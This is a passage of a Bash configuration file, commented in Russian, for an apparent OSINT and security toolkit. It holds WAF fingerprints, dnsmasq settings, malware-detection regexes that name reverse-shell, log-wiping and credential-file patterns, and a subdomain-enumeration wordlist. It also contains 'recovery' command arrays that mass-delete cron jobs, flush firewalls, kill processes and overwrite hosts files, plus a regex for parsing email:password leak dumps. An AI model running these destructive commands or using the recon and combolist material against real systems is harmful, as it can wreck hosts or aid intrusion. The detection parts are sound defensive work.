    # --- 2. HTTP/WAF Protocol Blocks ---
    '\b(403|406|429|451|error 403|error 429|forbidden|not acceptable|blocked by|ip blocked|too many requests|rate limit exceeded)\b'
    
    # --- 3. Vendor-Specific WAF & CDN Fingerprints ---
    '\b(cloudflare|turnstile|hcaptcha|recaptcha|sucuri|ddos-guard|akamai|gslb|f5_big-ip|imperva|incapsula|aws-waf|cloudfront|fastly|barracuda|citrix|perimeterx)\b'
    
    # --- 4. Browser/Behavioral Challenge Indicators ---
    '\b(checking your browser|security check|action required|verify identity|prove you are human|js-challenge|waf-challenge|challenge-platform|threat-score)\b'
    
    # --- 5. System/Debug/Internal Signals (WAF Leaks) ---
    '\b(block_id|cf-chk-wrapper|x-waf-block|request-id-blocked|security_challenge|waf-bypass|threat-detection|suspicious-user-agent)\b'
)


# ==============================================================================
# GLOBAL OSINT CORE CONSTANTS & NETWORK PROFILE (v17.5)
# ==============================================================================

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР СЕТЕВЫХ КОНФИГУРАЦИЙ (NET-CONFIG-NEXUS: ULTIMATE)
# ==============================================================================
GLOBAL_NET_CONFIG_MATRIX=(
    "CONNECT_TIMEOUT=5"
    "MAX_SESSION_TIME=12"
    "RESOLVER_CONNECT_TIMEOUT=5"
    "RESOLVER_MAX_TIME=8"
    "RETRY_ATTEMPTS=3"
    "USER_AGENT_MODE=STEALTH"
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР ШЛЮЗОВ И ПЛАТФОРМЕННЫХ РОУТОВ (GATEWAY-NEXUS: ULTIMATE FULL-STACK)
# ==============================================================================
GLOBAL_GATEWAY_MATRIX=(
    # --- 1. Платформенные роуты (Исключение социального шума) ---
    '\b(p|reel|reels|stories|share|messages|photo|photos|videos|watch|search|explore|shorts|status|trending|clips|live|about|legal|terms|privacy|help|settings|notifications|bookmark|lists|profile|analytics|ads|advertising|campaign|monetization|creators|community|channels|featured|playlists|subscriptions|store|podcasts|gaming|news|sports|fashion|beauty|learning|maps|hashtag|tags|category|posts|pages|groups|events|marketplace|jobs|companies|school|alumni|feed|following|followers|mutual|history|saved|archive|activity|digest|insights|verify|badge|security|login|signin|signup|register|logout)\b'

    # --- 2. RAW-шлюзы (Классические и региональные поисковики) ---
    '\b(yahoo\.(com|co|fr|de|it|es|ca|co\.uk)|aol\.(com|co\.uk)|ask\.com|excite\.com|search-results\.com|info\.com|gibiru\.com|bing\.com|yandex\.(ru|com)|baidu\.com|naver\.com|seznam\.cz)\b'

    # --- 3. ENCODED/PRIVACY-шлюзы (Анонимные, мета-поиск и Tor2Web) ---
    '\b(html\.duckduckgo\.com|search\.brave\.com|mojeek\.com|searx\.(be|fmac|me|space|info|link|work|xyz|org|net)|priv\.au|ononoki\.org|startpage\.com|metager\.de|swisscows\.com|qwant\.com|ecosia\.org)\b'

    # --- 4. Deep Web Gateway (Tor2Web/Onion Proxies) ---
    '\b([a-z0-9]+\.(onion|tor2web\.(org|me|to|cf|li|it)))\b'
)

# ==============================================================================
# GLOBAL CORE NETWORK DNS INFRASTRUCTURE MATRIX (v22.0 INDUSTRIAL COMPLETE)
# ==============================================================================
# Максимально мощный и полный массив параметров конфигурации dnsmasq.
# Маркеры %IP% и %HOST% динамически интерполируются ядром в момент синхронизации.
# Защищено от: DNS-утечек, Rebind-атак, зацикливания и деградации производительности кэша.
GLOBAL_DNS_CONFIG_MATRIX=(
    # --- БЛОК 1: БАЗОВАЯ БЕЗОПАСНОСТЬ И ФИЛЬТРАЦИЯ ЗАПРОСОВ ---
    "domain-needed"                             # Не передавать простые имена (без точки/домена) в upstream-серверы
    "bogus-priv"                                # Не передавать запросы обратного просмотра (reverse lookup) для приватных подсетей в WAN
    "no-resolv"                                 # Полный игнорировать системный /etc/resolv.conf (защита от перехвата провайдером)
    "no-poll"                                   # Не опрашивать внешние файлы конфигурации на предмет изменений
    "stop-dns-rebind"                           # Защита от Rebind-атак (блокирует ответы 127.0.0.0/8 и приватных IP от внешних серверов)
    "rebind-localhost-ok"                       # Разрешить loopback-адреса для легитимных локальных связок

    # --- БЛОК 2: СЕТЕВЫЕ ИНТЕРФЕЙСЫ И МАРШРУТИЗАЦИЯ ---
    "interface=lo"                              # Локальная петля обратной связи
    "interface=wlan0"                           # Беспроводной адаптер ядра
    "interface=eth0"                            # Проводной физический интерфейс
    "bind-dynamic"                              # Динамическое связывание сокетов при падении/поднятии сетевых карт
    
    # --- БЛОК 3: УЛЬТИМАТИВНОЕ КЭШИРОВАНИЕ И ОПТИМИЗАЦИЯ ТАЙМ-АУТОВ ---
    "cache-size=10000"                          # Выкрученный на максимум кэш (стандарт: 150, оптимум для жесткого OSINT/сканирования: 10000)
    "local-ttl=300"                             # Время жизни (TTL) для локальных ответов из файла/массива (5 минут стабильности)
    "neg-ttl=60"                                # Время кэширования негативных ответов (если домен не существует, не опрашивать WAN 60 сек)
    "max-cache-ttl=3600"                        # Максимальный лимит удержания валидного кэша в секундах
    "dns-forward-max=150"                       # Максимальное количество одновременных конкурентных DNS-запросов

    # --- БЛОК 4: ИЗОЛЯЦИЯ ЛОКАЛЬНОЙ ЗОНЫ (Предотвращение утечек) ---
    "local=/local/"                             # Объявление суффикса .local чисто внутренним (запросы к нему никогда не уйдут на 1.1.1.1)
    "local=/portal/"                            # Изоляция зоны .portal внутри периметра ядра
    
    # --- БЛОК 5: ДИНАМИЧЕСКАЯ МАТРИЦА ШЛЮЗОВ И СЕРВИСОВ ---
    "address=/scanclamavnexus/%IP%"             # Внутренний выделенный шлюз антивирусного сканера ClamAV
    "address=/%HOST%.nexus/%IP%"                # Динамический хост-резолв текущей машины
    "address=/prime.portal/%IP%"                # Главный веб-интерфейс управления платформы
    "address=/audit.nexus/%IP%"                 # Выделенная точка сбора логов безопасности и аудита
    "address=/localhost/127.0.0.1"              # Принудительный хардкод петли
    "address=/localhost/::1"                    # IPv6 петля для предотвращения задержек парсеров
    "address=/app0.nexus/%IP%"
    "address=/app1.nexus/%IP%"
    "address=/app2.nexus/%IP%"

    # --- БЛОК 6: ГЛОБАЛЬНЫЕ ВНЕШНИЕ АПСТРИМЫ (Скорость + Шифрование/Резерв) ---
    "server=1.1.1.1"                            # Cloudflare Primary (Максимальный показатель TTFB в мире)
    "server=8.8.8.8"                            # Google Secondary (Резервный стабильный глобальный узел)
    "server=9.9.9.9"                            # Quad9 Security (Пассивный фильтр вредоносных и фишинговых доменов)
)

# ==============================================================================
# 5. МАТРИЦЫ ПАРОЛЬНОЙ ЭНТРОПИИ И СИСТЕМНОГО АУДИТА (PRIME SECURITY LAB CORE)
# ==============================================================================

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР КРИПТО-ЭНТРОПИИ И АУДИТА (PRIME-NEXUS: ULTIMATE INTEGRATED)
# ==============================================================================
GLOBAL_PRIME_INTEGRATED=(
    # --- 1. Матрица структурной валидации (POSIX ERE) ---
    '\b[A-Za-z0-9!@#$%^&*()_+=-]{12,}\b' # Повышено до 12 для соответствия стандартам 2026 года
    '[a-z]+'                            # Регулярка нижнего регистра
    '[A-Z]+'                            # Регулярка верхнего регистра
    '[0-9]+'                            # Регулярка цифр
    '[^A-Za-z0-9]+'                     # Регулярка спецсимволов

    # --- 2. Анти-паттерны (Anti-Dictionary/Sequence Filter) ---
    # Блокирует последовательности (123, abc, qwerty) и повторы символов (aaa)
    '!(qwerty|123456|password|admin|root|login)'
    '(.)\1{2,}'                         # Блокирует 3 одинаковых символа подряд (например, "aaa")
    '[a-zA-Z]{3,}'                      # Контроль длинных алфавитных блоков

    # --- 3. Математические константы энтропии (Shannon Entropy Config) ---
    'POOL_SIZE_ALPHA=52'                # Полный пул (a-z + A-Z)
    'POOL_SIZE_NUM=10'                  # Пул цифр
    'POOL_SIZE_SPEC=32'                 # Пул символов
    'TOTAL_POOL_SIZE=94'                # Максимальный пул символов (ASCII)
    'MIN_ENTROPY_BITS=80'               # Пороговое значение стойкости (Target: 80 bits)
)


# Предустановленные базовые векторы для ускоренного синтеза словарей
GLOBAL_PASS_PREFIXES=(
    "admin|Default Administrator Root Portal"
    "root|Superuser Linux/Android Engine Base"
    "main|Primary Infrastructure System Node"
    "secure|Encrypted Security Layer Entry"
    "core|Framework Kernel Control Core"
    "prime|Ultimate Prime Core Vector"
    "gate|Network Active Gate Protection"
)

# Жесткие лимиты безопасности ядра для защиты флеш-памяти устройства
PASS_LAB_DEFAULT_LEN=20
PASS_LAB_MAX_DIGITS=6

# ==============================================================================
# 7. ГЛОБАЛЬНЫЕ СИГНАТУРЫ ДЛЯ АНТИВИРУСНОГО ДВИЖКА (ANTI-MALWARE CORE PATTERNS)
# ==============================================================================
# [СТАТИЧЕСКИЙ КОНТУР: СКАНИРОВАНИЕ ФАЙЛОВ, СКРИПТОВ И ИСПОЛНЯЕМЫХ БИНАРНИКОВ]

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР АНТИВИРУСНОГО ДВИЖКА (ANTI-MALWARE CORE: ULTIMATE RECON v7.0)
# ==============================================================================
# АРХИТЕКТУРА: Полная совместимость с POSIX ERE движками (grep -Ei)
# ЗАМЕЩЕНИЕ: Полное поглощение GLOBAL_AV_SYS_CALLS, NET_VECTORS, MAL_MARKERS, LOLBAS
# ПРИНЦИП: Тотальная очистка конфигурации от одиночных незащищенных переменных
# СТАТУС: ZERO LOOSE VARIABLES | FULL ENVELOPE METADATA | NO SHORTENINGS
# ==============================================================================
GLOBAL_AV_MATRIX=(
    # --- 0. Kernel Layer & Process Injection [LAYER 1] ---
    # Поглощено: GLOBAL_AV_SYS_CALLS (Мониторинг syscalls, инъекций, руткитов и хуков ядра)
    # Детектирует: манипуляции процессами, скрытые дескрипторы, chroot и эскалацию прав через setuid/setgid
    '\b(ptrace|memfd_create|process_vm_readv|process_vm_writev|mprotect|mmap|execve|chroot|setuid|setgid|sys_clone|init_module|finit_module|kexec_load|inotify_init|vmsplice|splice|fork|clone)\b'
    
    # --- 1. Reverse Shell & Socket Hijacking [LAYER 2] ---
    # Поглощено: GLOBAL_AV_NET_VECTORS (Деструктивные сетевые векторы и кросс-платформенные веб-шеллы)
    # Детектирует: сокеты Bash/Python/Perl/PHP/Ruby/Lua, пайпы, туннели и инжекты curl/wget в командный интерпретатор
    '(/dev/(tcp|udp)/[0-9.]+|nc\ -(e|c|l)|nc\.openbsd|netcat\ -e|socat\ (tcp|udp|sctp)-connect|python3?.*(socket|subprocess|-c.*import)|perl.*-e.*socket|php\ -r.*fsockopen|ruby\ -e.*TCPSocket|lua\ -e.*socket|curl.*\|.*(bash|sh)|wget.*\|.*(bash|sh)|fetch.*\|.*sh|bash\ -i|sh\ -i|zsh\ -i|exec\ [0-9]<>/dev/tcp|mkfifo.*\/tmp\/.*openssl|stty\ raw\ -echo)'
    
    # --- 2. Persistence & Forensics Sabotage [LAYER 3] ---
    # Поглощено: GLOBAL_AV_MAL_MARKERS (Маркеры скрытого присутствия, уничтожение аудит-логов и шифровальщики)
    # Детектирует: зачистку истории, манипуляции с cron/systemd/init, массовое затирание и chattr-блокировку
    '(rm\ -rf\ /|unset\ HISTFILE|history\ -c|killall.*log|logsave\ /dev/null|openssl\ enc\ -aes|gpg\ --encrypt|shred\ -u|auth\.log.*>\?|cron\.d/|systemd/system/|rc\.local|\.config/autostart|/etc/shadow|/etc/sudoers|chattr\ \+i|trap\ \x27\x27|set\ \+o\ history|/var/log/(auth|sys|secure)\.log)'
    
    # --- 3. LOLBAS & Advanced Exploitation [LAYER 4] ---
    # Поглощено: GLOBAL_AV_LOLBAS_MATRIX (Кросс-платформенный хакерский софт, сканеры и эксплойты)
    # Детектирует: чтение приватных баз (/etc/passwd), кражу теневых копий, Windows-компоненты и дамперы памяти
    '\b(cmd\.exe|powershell|wmic|cmdlet|api_string|bitsadmin|certutil|rundll32|regsvr32|mshta|psexec|mimikatz|nmap|masscan|sqlmap|hydra|aircrack|chisel|frp|ngrok|autoruns|vssadmin|wevtutil|schtasks|sc\ query|cobaltstrike|metasploit|shadowsploit|linpeas|winpeas|exploitdb)\b|/etc/passwd'
    
    # --- 4. Active Malware Processes & Runtime Shells [LAYER 5] ---
    # Поглощено: GLOBAL_AV_ACTIVE_MALWARE_PROCS (Перехват активных мошеннических бинарников в ОЗУ)
    # Детектирует: запущенные процессы компрометации, утилиты скрытого контроля и фоновые мультиплексоры
    '\b(nc|netcat|socat|chisel|frp|ngrok|nmap|masscan|hydra|xmrig|minerd|cryptonight|reverse)\b|stratum\+tcp|(sh|bash|zsh)[[:space:]]*-i|\b(tmux[[:space:]]+new.*-d|screen[[:space:]]*-d[[:space:]]*-m)\b'
    
    # --- 5. Critical Socket States Filter [LAYER 6] ---
    # Поглощено: GLOBAL_AV_SOCKET_STATES (Фильтр критических состояний сетевых дескрипторов)
    # Детектирует: бэкдоры на прослушивании портов, установленные сессии утечки и синхронизацию сокетов
    '\b(LISTEN|ESTABLISHED|ESTAB|SYN_SENT|SYN_RECV)\b'
    
    # --- 6. Memory-Resident Malware & Miners [LAYER 7] ---
    # Скрытые бесфайловые runtime-угрозы, майнинг-пулы и аномальные дескрипторы в /proc/ и /tmp/
    '\b(xmrig|minerd|cryptonight|stratum\+tcp|reverse|tmux\ new.*-d|screen\ -d\ -m|memfd_create|/proc/self/fd/[0-9]+|/tmp/\.[a-zA-Z0-9]{8,})\b'
    
    # --- 7. Library Hijacking [LAYER 8] ---
    # Попытки инъекций вредоносных shared-библиотек через переменные среды окружения (LD_PRELOAD)
    '\b(LD_PRELOAD|LD_LIBRARY_PATH|/etc/ld\.so\.preload|dlopen|dlsym)\b'
)


# ==============================================================================
# ЕДИНЫЙ МОНОЛИТНЫЙ СУПЕР-КОНВЕЙЕР УЛЬТИМАТИВНОЙ ЭВРИСТИКИ ДЛЯ АВТОПИЛОТА CAME
# ==============================================================================
GLOBAL_AV_ENGINE_PIPE="${GLOBAL_AV_SYS_CALLS}|${GLOBAL_AV_NET_VECTORS}|${GLOBAL_AV_MAL_MARKERS}|${GLOBAL_AV_LOLBAS_MATRIX}"

# ==============================================================================
# 8. ГЛОБАЛЬНЫЕ МАТРИЦЫ КРОСС-ПЛАТФОРМЕННОЙ РЕАНИМАЦИИ (OS RECOVERY MATRICES)
# ==============================================================================
# ==============================================================================
# 8. ГЛОБАЛЬНЫЕ МАТРИЦЫ КРОСС-ПЛАТФОРМЕННОЙ РЕАНИМАЦИИ (OS RECOVERY MATRICES)
# ==============================================================================
GLOBAL_FIX_WIN_REG=(
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f'
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 0 /f'
    'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
    'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f'
    'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 0 /f'
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 1 /f'
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f'
    'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f'
    'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f'
    'reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /va /f'
    'reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /va /f'
    'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /va /f'
    'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /va /f'
    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 2 /f'
    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 2 /f'
    'attrib -r -s -h C:\Windows\System32\drivers\etc\hosts'
    'echo "127.0.0.1 localhost\n::1 localhost" > C:\Windows\System32\drivers\etc\hosts'
)

# ==============================================================================
# [КОНТУР LINUX: ГЛУБОКАЯ ЗАЧИСТКА ХОСТА, СБРОС ТРАФИКА И ИЗОЛЯЦИЯ ЮЗЕРСПЕЙСА]
# ==============================================================================
GLOBAL_FIX_LINUX=(
    'rm -rf /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/* /var/spool/cron/crontabs/* /etc/anacrontab'
    'rm -rf /etc/systemd/system/*.timer /lib/systemd/system/*.timer'
    '> /etc/ld.so.preload'
    'chattr -i /etc/resolv.conf'
    'echo -e "nameserver 1.1.1.1\nnameserver 8.8.8.8\nnameserver 9.9.9.9" > /etc/resolv.conf'
    'chattr +i /etc/resolv.conf'
    'iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT'
    'iptables -F; iptables -X; iptables -t nat -F; iptables -t nat -X; iptables -t mangle -F; iptables -t mangle -X'
    'nft flush ruleset'
    'echo -e "127.0.0.1 localhost\n::1 localhost" > /etc/hosts'
)

# Активация (вызов в коде):
# for cmd in "${GLOBAL_FIX_LINUX[@]}"; do eval "$cmd" 2>/dev/null; done

# ==============================================================================
# [КОНТУР MACOS: ПОЛНОЕ КУПИРОВАНИЕ ПЕРСИСТЕНТНОСТИ И ДЕАКТИВАЦИЯ АГЕНТОВ]
# ==============================================================================
GLOBAL_FIX_MACOS=(
    'launchctl unload -w /Library/LaunchAgents'
    'launchctl unload -w /Library/LaunchDaemons'
    'launchctl unload -w ~/Library/LaunchAgents'
    'sudo chmod 000 /Library/LaunchAgents/* /Library/LaunchDaemons/* ~/Library/LaunchAgents/*'
    'sudo rm -rf /private/var/db/launchd.db/com.apple.launchd/overrides.plist'
    'sudo pfctl -F all -FS'
    'sudo pfctl -d'
    'sudo chmod +w /etc/hosts'
    'echo -e "127.0.0.1 localhost\n::1 localhost" > /etc/hosts'
    'sudo killall -9 -u $(whoami)'
)

# Активация матрицы (вызов в коде):
# for cmd in "${GLOBAL_FIX_MACOS[@]}"; do eval "$cmd" 2>/dev/null; done


# ==============================================================================
# @description: ГЛОБАЛЬНЫЕ ТЕХНОЛОГИЧЕСКИЕ СИГНАТУРЫ ЯДРА (CORE INFRA MATCHERS)
# МОДЕРНИЗАЦИЯ: Максимально полный промышленный пак для глубокого OSINT-фингерпринтинга
# ФОРМАТ: "Токен1|Токен2|ТокенN|Категория (Имя_Технологии)"
# ==============================================================================
GLOBAL_INFRA_SIGNATURES=(
    # --- СЛОЙ 1:СИСТЕМЫ УПРАВЛЕНИЯ КОНТЕНТОМ (CMS & E-COMMERCE) ---
    "WordPress|wp-content|wp-includes|wp-json|wp-login|CMS (WordPress)"
    "Joomla|joomla|option=com_|Joomla!"
    "Drupal|drupal|sites/all|core/assets/vendor|CMS (Drupal)"
    "Bitrix|bitrix|/bitrix/|bx-core|CMS (1C-Bitrix)"
    "Magento|/mage/|Mage.Cookies|magento|CMS (Magento E-Commerce)"
    "Shopify|cdn.shopify.com|shopify-features|Shopify.theme|CMS (Shopify)"
    "WooCommerce|woocommerce|wp-content/plugins/woocommerce|E-Commerce (WooCommerce)"
    "PrestaShop|prestashop|/modules/block|CMS (PrestaShop)"
    "OpenCart|opencart|index.php?route=|CMS (OpenCart)"
    "Ghost|ghost-backend|casper-style|ghost.org|CMS (Ghost Blog)"
    "Webflow|data-wf-page|webflow.js|w-nav|Web-Builder (Webflow)"
    "Wix|wix-code-sdk|wixstyles|wix.com|Web-Builder (Wix)"
    "Tilda|tilda|tildacss|tildastat|tilda-grid|Web-Builder (Tilda)"

    # --- СЛОЙ 2: ВЕБ-СЕРВЕРЫ И ПРИКЛАДНЫЕ КОНТЕЙНЕРЫ ---
    "nginx|nginx/|X-Backend-Server: nginx|Web Server (Nginx)"
    "Apache|apache|httpd|Apache/2|X-Powered-By: Apache|Web Server (Apache)"
    "LiteSpeed|litespeed|LiteSpeed/|X-LiteSpeed-Cache|Web Server (LiteSpeed)"
    "Microsoft-IIS|IIS/|Microsoft-IIS|IIS-8|IIS-10|Web Server (Microsoft IIS)"
    "Tomcat|Coyote/|Apache-Coyote|Tomcat/|Application Server (Apache Tomcat)"
    "Gunicorn|gunicorn|gunicorn/|Python Web Server (Gunicorn)"
    "Node.js|Express|express.js|X-Powered-By: Express|Backend Runtime (Node.js/Express)"

    # --- СЛОЙ 3: CDN, WAF, ОБЛАЧНЫЕ ПРОКСИ И ЗАЩИТА ---
    "cloudflare|cloudflare-nginx|__cfduid|cf-ray|cf-cache-status|Cloudflare Edge (WAF/CDN)"
    "Cloudfront|cloudfront.net|X-Amz-Cf-Id|X-Cache: Miss from cloudfront|Amazon CloudFront (CDN)"
    "Akamai|akamai|AkamaiGHost|X-Akamai-Transformed|Akamai Edge (CDN)"
    "Incapsula|incapsula|visid_incap_|incap_ses_|Imperva Incapsula (WAF/CDN)"
    "Sucuri|sucuri|Sucuri/Cloudproxy|X-Sucuri-ID|Sucuri Cloudproxy (WAF)"
    "DDOS-GUARD|ddos-guard|DDoS-Guard|DDOS-GUARD Engine (WAF/Mitigation)"
    "Variti|variti|Variti-Active-Guard|Variti Systems (Anti-Bot WAF)"

    # --- СЛОЙ 4: ЯЗЫКИ ПРОГРАММИРОВАНИЯ И СРЕДЫ (X-POWERED-BY) ---
    "PHP|php/|X-Powered-By: PHP|PHPSESSID|Runtime Environment (PHP Node)"
    "ASP.NET|ASP.NET|X-AspNet-Version|__VIEWSTATE|Runtime Environment (Microsoft ASP.NET)"
    "Python|WSGI|Django|django_session|Runtime Environment (Python / Django)"
    "Ruby|Phusion Passenger|Rack-Cache|Runtime Environment (Ruby on Rails)"
    "Next.js|/_next/static/|X-Powered-By: Next.js|Frontend Framework (Next.js SSR)"

    # --- СЛОЙ 5: ОБЛАЧНЫЕ ХРАНИЛИЩА И ИНФРАСТРУКТУРА (CLOUD BACKENDS) ---
    "AmazonS3|s3.amazonaws.com|s3-website|amzn-s3-|Cloud Storage (Amazon S3 Bucket)"
    "GoogleCloud|storage.googleapis.com|GoogleCloudStorage|Cloud Storage (Google Cloud Storage)"
    "AzureBlob|blob.core.windows.net|Windows-Azure-Blob|Cloud Storage (Microsoft Azure Blob)"
    "Heroku|heroku|herokucdn|X-Heroku-Queue-Depth|Cloud Platform (Heroku App App Node)"
    "Firebase|firebaseio.com|firebaseapp.com|__firebase|Cloud Platform (Google Firebase Backend)"

    # --- СЛОЙ 6: ПАНЕЛИ УПРАВЛЕНИЯ ХОСТИНГОМ (СЕРВЕРНЫЙ СТЭК) ---
    "cPanel|cpanel/|cPanel-WebServer|cpsess|Hosting Panel (cPanel)"
    "Plesk|plesk|PleskLin|PleskWin|Hosting Panel (Plesk)"
    "DirectAdmin|DirectAdmin|da_|Hosting Panel (DirectAdmin)"
    "ISPmanager|ispmanager|ispmgr|Hosting Panel (ISPmanager)"
    "VestaCP|vestacp|vesta-|Hosting Panel (VestaCP)"
    "HestiaCP|hestiacp|hestia-|Hosting Panel (HestiaCP)"
    "CyberPanel|cyberpanel|lscpd|Hosting Panel (CyberPanel)"

    # --- СЛОЙ 7: СИСТЕМЫ АНАЛИТИКИ И ТРЕКИНГА (МАРКЕРЫ СЛЕЖКИ) ---
    "GoogleAnalytics|google-analytics.com|ua-|gtm.js|ga('create')|Analytics Stack (Google Analytics/GTM)"
    "YandexMetrika|mc.yandex.ru|watch/|metrika|Analytics Stack (Yandex Metrika)"
    "Hotjar|hotjar.com|hj-|hotjar.js|Analytics Stack (Hotjar Heatmaps)"
    "FacebookPixel|connect.facebook.net/en_US/fbevents.js|fbq(|Analytics Stack (Facebook Pixel Meta)"

    # --- СЛОЙ 8: БАЗЫ ДАННЫХ И СЛУЖЕБНЫЕ ИНТЕРФЕЙСЫ (ОШИБКИ/УТЕЧКИ) ---
    "MySQL|mysql_connect(|SQL syntax; check the manual|MySQL server version|Database Leak (MySQL Engine)"
    "PostgreSQL|PostgreSQL query failed:|PGRES_FATAL_ERROR|Database Leak (PostgreSQL Engine)"
    "MongoDB|MongoDB.Driver|MongoNetworkException|Database Leak (MongoDB)"
    "Redis|redis.exceptions|Redis.Client|Database Leak (Redis Key-Value Store)"
    "Elasticsearch|cluster_name|lucene_version|Elasticsearch REST|Database Leak (Elasticsearch Engine)"
    "phpMyAdmin|phpmyadmin|pma_cookie|Database Management (phpMyAdmin Portal)"
)


# ==============================================================================
# @description: ГЛОБАЛЬНЫЙ ТОП-СЛОВАРЬ СУБДОМЕНОВ ЯДРА (CORE DNS WORDLIST)
# МОДЕРНИЗАЦИЯ: Максимальный промышленный пак для глубокого асинхронного DNS-маппинга
# СТРУКТУРА: Разделен на логические кластеры для удобства расширения и аудита
# ==============================================================================
GLOBAL_DNS_WORDLIST=(
    # --- СЛОЙ 1: КЛАССИЧЕСКАЯ ИНФРАСТРУКТУРА И МАРШРУТИЗАЦИЯ ---
    "www" "ww2" "ww3" "web" "main" "root" "server" "node" "node1" "node2"
    "ns" "ns1" "ns2" "ns3" "ns4" "dns" "dns1" "dns2" "gw" "gate" "gateway"
    "router" "fw" "firewall" "proxy" "reverse" "lb" "loadbalancer" "cdn"

    # --- СЛОЙ 2: ПОЧТОВЫЕ СЕРВИСЫ И СЛУЖБЫ КОРПОРАТИВНОЙ СВЯЗИ ---
    "mail" "mail1" "mail2" "mx" "mx1" "mx2" "smtp" "pop" "pop3" "imap"
    "webmail" "exchange" "owa" "autodiscover" "m" "mobile" "sip" "vibe"
    "relay" "mta" "lists" "newsletter" "post" "postmaster" "incoming"

    # --- СЛОЙ 3: УПРАВЛЕНИЕ, АДМИНИСТРИРОВАНИЕ И СЕРВЕРНЫЕ ПАНЕЛИ ---
    "admin" "administrator" "adm" "rootadmin" "manager" "manage" "control"
    "panel" "cpanel" "whm" "plesk" "isp" "directadmin" "pma" "phpmyadmin"
    "myadmin" "pgadmin" "dbadmin" "mysql" "sql" "db" "database" "db1" "db2"
    "redis" "elastic" "es" "mongo" "mongodb" "cluster" "console" "dashboard"

    # --- СЛОЙ 4: РАЗРАБОТКА, СРЕДЫ ТЕСТИРОВАНИЯ И РЕЛИЗЫ (CI/CD) ---
    "dev" "development" "dev1" "dev2" "test" "test1" "test2" "testing"
    "stage" "staging" "stg" "prod" "production" "prd" "local" "localhost"
    "demo" "sandbox" "lab" "beta" "alpha" "new" "old" "archive" "backup"
    "bkp" "storage" "files" "file" "nas" "s3" "cdn-dev" "static" "assets"

    # --- СЛОЙ 5: ДЕВОПС, РЕПОЗИТОРИИ И АВТОМАТИЗАЦИЯ (DEVOPS TARGETS) ---
    "git" "gitlab" "github" "gitea" "svn" "bitbucket" "repo" "registry"
    "docker" "hub" "k8s" "kubernetes" "jenkins" "ci" "cd" "teamcity"
    "ansible" "puppet" "chef" "sonar" "sonarqube" "nexus" "artifactory"

    # --- СЛОЙ 6: УДАЛЕННЫЙ ДОСТУП, СЕТЕВЫЕ ШЛЮЗЫ И БЕЗОПАСНОСТЬ ---
    "vpn" "vpn1" "vpn2" "remote" "rds" "rdp" "ts" "terminal" "citrix"
    "vps" "ssh" "secure" "ssl" "cert" "certs" "ca" "auth" "login" "signin"
    "sso" "oauth" "keycloak" "id" "identity" "gatekeeper" "access" "radius"

    # --- СЛОЙ 7: ВНУТРЕННИЕ СЕРВИСЫ, АНАЛИТИКА И МОНИТОРИНГ ---
    "api" "api-dev" "api-prod" "v1" "v2" "rest" "graphql" "ws" "internal"
    "int" "private" "corp" "intranet" "portal" "hub" "wiki" "confluence"
    "jira" "redmine" "kb" "help" "support" "billing" "pay" "payment"
    "shop" "store" "cart" "checkout" "crm" "erp" "sap" "hr" "office"
    "monitor" "monitoring" "status" "stats" "grafana" "prometheus" "zabbix"
    "nagios" "kibana" "splunk" "log" "logs" "logging" "sentry" "telemetry"

    # --- СЛОЙ 8: ОДНОБУКВЕННЫЕ И ЦИФРОВЫЕ ШЛЮЗЫ (УТИЛИТАРНЫЕ УЗЛЫ) ---
    "a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "p" "r" "s" "t" "u" "x"
    "0" "1" "2" "3" "4" "5" "8" "9" "10" "11" "20" "50" "100"
)


# ==============================================================================
# ЕДИНЫЙ РЕЕСТР УЧЕТНЫХ ЗАПИСЕЙ И СТРУКТУР COMB (AUTH-NEXUS: ULTIMATE FULL-STACK v2.5)
# ==============================================================================
# АРХИТЕКТУРА: Полная совместимость с POSIX ERE движками (grep -oE)
# МОДИФИКАЦИЯ: Замена нестабильных \s на жесткие [:space:] классы, расширение разделителей
# НАЗНАЧЕНИЕ: Потоковый форензик текстовых дампов, COMB, инжектированных таблиц и логов
# ==============================================================================
GLOBAL_AUTH_MATRIX=(
    # --- 1. СТАНДАРТНЫЙ COMB (EMAIL:PASSWORD) ---
    # Покрывает: двоеточие, точку с запятой, вертикальную черту и знак равенства
    # Пароль отсекается по первому встречному пробелу, табуляции или кавычке
    '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}[[:space:]]*[:;|=[[:space:]]][[:space:]]*[^[:space:][:cntrl:];,\x27\x22]+\b'
    
